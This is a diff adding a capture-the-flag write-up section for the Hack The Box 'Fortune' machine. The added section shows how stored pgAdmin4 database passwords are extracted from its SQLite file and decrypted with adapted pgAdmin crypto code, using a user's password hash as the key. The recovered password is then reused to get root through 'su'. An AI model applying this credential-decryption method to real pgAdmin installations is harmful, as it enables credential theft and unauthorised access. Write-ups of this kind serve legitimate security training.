@@ -337,6 +337,66 @@ Looks like `Bob` decided to drop us a hint about the `pgadmin4` database! Bob ap
 
 After a bit of digging, I found that the dba's password to the `PostgreSQL` database actually resides in an `SQLite3` database located at `/var/appsrv/pgadmin4/pgadmin4.db`.
 
+I looked up `pgadmin4` online and found the open source GitHub page for it. Upon sifting through some of the code, I found these lines around the line ~250 mark:
+
+```
+  try:
+    password = decrypt(encpass, user.password)
+    # Handling of non ascii password (Python2)
+    if hasattr(str, 'decode'):
+      password = password.decode('utf-8').encode('utf-8')
+    # password is in bytes, for python3 we need it in string
+    elif isinstance(password, bytes):
+      password = password.decode()
+
+  except Exception as e:
+    manager.stop_ssh_tunnel()
+    current_app.logger.exception(e)
+    return False, \
+      _(
+        "Failed to decrypt the saved password.\nError: {0}"
+      ).format(str(e))
+```
+
+At the top, I noticed that the decryption key is pulled from the `user.password`, which can actually already be found in the `pgadmin4.db` file. At this point, I wanted to understand how the `decrypt()` function was working. The code for it can be found here:
+
+```
+def decrypt(ciphertext, key):
+    """
+    Decrypt the AES encrypted string.
+
+    Parameters:
+        ciphertext -- Encrypted string with AES method.
+        key        -- key to decrypt the encrypted string.
+    """
+
+    ciphertext = base64.b64decode(ciphertext)
+    iv = ciphertext\[:iv_size\]
+
+    cipher = Cipher(AES(pad(key)), CFB8(iv), default_backend())
+    decryptor = cipher.decryptor()
+    return decryptor.update(ciphertext\[iv_size:\]) + decryptor.finalize()
+
+
+def pad(key):
+    """Add padding to the key."""
+
+    if isinstance(key, six.text_type):
+        key = key.encode()
+
+    # Key must be maximum 32 bytes long, so take first 32 bytes
+    key = key\[:32\]
+
+    # If key size is 16, 24 or 32 bytes then padding is not required
+    if len(key) in (16, 24, 32):
+        return key
+
+    # Add padding to make key 32 bytes long
+    return key.ljust(32, padding_string)
+```
+
+This is perfect, because all of the parameters are already found in the `pgadmin4.db` file.
+
 Once I opened the database with `sqlite3`, I ran `.tables` to check what tables existed in the database.
 
 ```
@@ -351,14 +411,163 @@ process                      version
 role 
 ```
 
-From here, I ended up determining that the `server` table contained the username and password contents for the database administrator:
+I ended up determining that the `server` table contained the username and password contents for the database administrator:
 
 ```
 sqlite> select username,password from server;
 dba|utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz
 ```
 
-## Writeup In Progress... Stay tuned!
+In addition, I could grab user password hashes as keys like so:
+
+```
+sqlite> select email,password from user;
+charlie@fortune.htb|$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ
+bob@fortune.htb|$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
+```
+
+To decrypt the credentials, I ended up grabbing a copy of the original `crypto.py` file containing the `decrypt()` function from the `pgadmin4` GitHub page to run on my local kali machine.
+
+I added a couple lines at the bottom of the file that would create a variable called `admpass` and then utilize the `decrypt()` function to decrypt the data we found. Once decrypted, the password is stored in the `admpass` variable and then printed into console.
+
+Here is my finalized code for the `crypto.py` file:
+
+```
+import base64
+import hashlib
+
+
+from Crypto import Random
+from Crypto.Cipher import AES
+
+padding_string = b'}'
+
+
+def encrypt(plaintext, key):
+    """
+    Encrypt the plaintext with AES method.
+
+    Parameters:
+        plaintext -- String to be encrypted.
+        key       -- Key for encryption.
+    """
+
+    iv = Random.new().read(AES.block_size)
+    cipher = AES.new(pad(key), AES.MODE_CFB, iv)
+    # If user has entered non ascii password (Python2)
+    # we have to encode it first
+    if hasattr(str, 'decode'):
+        plaintext = plaintext.encode('utf-8')
+    encrypted = base64.b64encode(iv + cipher.encrypt(plaintext))
+
+    return encrypted
+
+
+def decrypt(ciphertext, key):
+    """
+    Decrypt the AES encrypted string.
+
+    Parameters:
+        ciphertext -- Encrypted string with AES method.
+        key        -- key to decrypt the encrypted string.
+    """
+
+    global padding_string
+
+    ciphertext = base64.b64decode(ciphertext)
+    iv = ciphertext[:AES.block_size]
+    cipher = AES.new(pad(key), AES.MODE_CFB, iv)
+    decrypted = cipher.decrypt(ciphertext[AES.block_size:])
+
+    return decrypted
+
+
+def pad(key):
+    """Add padding to the key."""
+
+    global padding_string
+    str_len = len(key)
+
+    # Key must be maximum 32 bytes long, so take first 32 bytes
+    if str_len > 32:
+        return key[:32]
+
+    # If key size id 16, 24 or 32 bytes then padding not require
+    if str_len == 16 or str_len == 24 or str_len == 32:
+        return key
+
+    # Convert bytes to string (python3)
+    if not hasattr(str, 'decode'):
+        padding_string = padding_string.decode()
+
+    # Add padding to make key 32 bytes long
+    return key + ((32 - str_len % 32) * padding_string)
+
+
+def pqencryptpassword(password, user):
+    """
+    pqencryptpassword -- to encrypt a password
+    This is intended to be used by client applications that wish to send
+    commands like ALTER USER joe PASSWORD 'pwd'.  The password need not
+    be sent in cleartext if it is encrypted on the client side.  This is
+    good because it ensures the cleartext password won't end up in logs,
+    pg_stat displays, etc. We export the function so that clients won't
+    be dependent on low-level details like whether the enceyption is MD5
+    or something else.
+
+    Arguments are the cleartext password, and the SQL name of the user it
+    is for.
+
+    Return value is "md5" followed by a 32-hex-digit MD5 checksum..
+
+    Args:
+      password:
+      user:
+
+    Returns:
+
+    """
+
+    m = hashlib.md5()
+
+    # Place salt at the end because it may be known by users trying to crack
+    # the MD5 output.
+    # Handling of non-ascii password (Python2)
+    if hasattr(str, 'decode'):
+        password = password.encode('utf-8')
+        user = user.encode('utf-8')
+    else:
+        password = password.encode()
+        user = user.encode()
+
+    m.update(password)
+    m.update(user)
+
+    return "md5" + m.hexdigest()
+
+admpass=decrypt("utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz","$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg")
+print(admpass)
+```
+
+To get it working, I had to use the password hash belonging to `bob`. 
+
+Upon running it locally, `crypto.py` spit out the password immediately!
+
+```
++[root@kali: HTB-FORTUNE]$ python crypto.py 
+R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
+```
+
+Now it's game over! I can run `su root` from my shell as `charlie` to gain root and `cat root.txt`!
+
+```
+fortune$ whoami
+charlie
+fortune$ su root
+Password:
+fortune# whoami
+root
+```
 
 <div align="center">
 	<h3> Thanks for reading! </h3>
